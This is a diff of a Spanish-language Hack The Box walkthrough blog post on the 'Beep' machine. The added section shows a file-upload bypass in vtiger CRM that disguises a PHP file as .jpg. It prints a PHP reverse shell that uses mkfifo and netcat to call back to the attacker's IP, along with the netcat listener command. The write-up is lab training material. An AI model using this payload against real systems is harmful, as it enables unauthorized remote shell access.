@@ -1,4 +1,4 @@
-I"2Y<p>El día de hoy vamos a resolver la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>
+I"�f<p>El día de hoy vamos a resolver la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/1.png" alt="" /></p>
 
@@ -250,11 +250,34 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/28.png" alt="" /></p>
 
+<p>Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.</p>
+
 <h3 id="fase-de-explotación---file-upload-bypass"><a href="#header-4"></a>Fase De Explotación - File Upload Bypass</h3>
 
-<p>DEF</p>
+<p>Si recordamos, en la fase de explotación a través del uso de un <em>LFI</em>, habíamos descubierto un panel de login de <code class="language-plaintext highlighter-rouge">vtiger CRM</code>; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/29.png" alt="" /></p>
+
+<p>Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado <em>Settings/Company Details</em>, vamos a ver que hay una opción que nos permite cambiar el logo de la compañia, por lo que ya vamos teniendo una idea, de que podemos hacer.</p>
+
+<p>De manera casi similar a la máquina <a href="https://mateonitro550.github.io/Vulnversity-TryHackMe">Vulnversity-TryHackMe</a>, vamos a tener que disfrazar un archivo <code class="language-plaintext highlighter-rouge">.php</code> como <code class="language-plaintext highlighter-rouge">.jpg</code>. No obstante, en este caso será un poco más sencillo ya que no haremos uso de <code class="language-plaintext highlighter-rouge">Burp Suite</code> (aunque podríamos); lo único que vamos a hacer es añadir la extensión <code class="language-plaintext highlighter-rouge">.jpg</code> a nuestra <code class="language-plaintext highlighter-rouge">reverseShell.php</code>.</p>
+
+<p>Podríamos utilizar la <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"><em>reverse shell</em></a> que nos provee <code class="language-plaintext highlighter-rouge">pentestmonkey</code> (para lo cual debemos modificar el campo <em>ip</em>, y colocar la nuestra, y si quisiéramos el campo <em>port</em>), o bien, crear nuestra propia <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nb">system</span><span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Y al igual que en los casos anteriores, previo a darle a <code class="language-plaintext highlighter-rouge">Save</code>, debemos de estar en escucha a través de <code class="language-plaintext highlighter-rouge">NetCat</code>, por el puerto que hayamos indicado en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/30.png" alt="" /></p>
+
+<p>Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario <code class="language-plaintext highlighter-rouge">asterisk</code>, por lo que ahora si debemos de realizar la escalada de privilegios.</p>
 
 <h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
 
-<p>GHI</p>
 :ET
